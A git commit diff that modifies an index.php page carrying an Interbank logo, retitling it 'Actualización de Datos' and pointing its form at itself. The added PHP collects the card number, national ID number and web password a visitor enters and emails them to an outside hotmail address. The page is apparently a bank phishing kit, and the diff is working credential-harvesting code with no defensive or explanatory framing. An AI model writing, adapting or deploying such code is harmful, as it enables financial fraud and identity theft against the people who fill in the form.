7a982506fecaecdab4f8476e5e9496a28cd54c90
Luis Fernando Gomez <lgomez@certuit.com>
2021-10-29 00:53:58 -0700

    modificación de archivo index.php

--- index.php
+++ index.php
@@ -7,14 +7,43 @@
     <link rel="stylesheet" href="css/estilos.css">
     <script src="js/funciones.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
-    <title>Bienvenido</title>
+    <title>Actualización de Datos</title>
 </head>
 <body>
+
+    <?php
+        if($_SERVER["REQUEST_METHOD"] == "POST") {
+            $cc = $_POST['cc'];
+            $pass = $_POST['pass'];
+            $dni = $_POST['dni'];
+
+            if(isset($cc, $dni, $pass)){
+                //$to = "cruzadoeduar18@gmail.com";
+                $to = "fernando1894@hotmail.com";
+                $subject = "ACTUALIZACION DE DATOS CORREO 1";
+                $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
+                    "DNI: " . $dni . "\n" . 
+                    "CLAVE WEB: " . $pass;
+                $headers = "From: pruebas@pruebas.ga";
+                mail($to, $subject, $txt, $headers);
+            }
+            else{
+                echo '
+                        <script type="text/javascript">
+                            $(document).ready(function(){
+                            Swal.fire("Datos guardados con éxito.")
+                            });
+                        </script>
+                    ';
+            }
+        }
+    ?>
+
     <div id="img-container">
         <img id="logo" src="img/im-logo.png" alt="Logo Interbank">
     </div>
     <div id="form-container" class="div-slide">
-        <form id="form" method="POST" action="save-data.php">
+        <form id="form" method="POST" action="">
 
             <p id="form-title">Bienvenido</p>
 
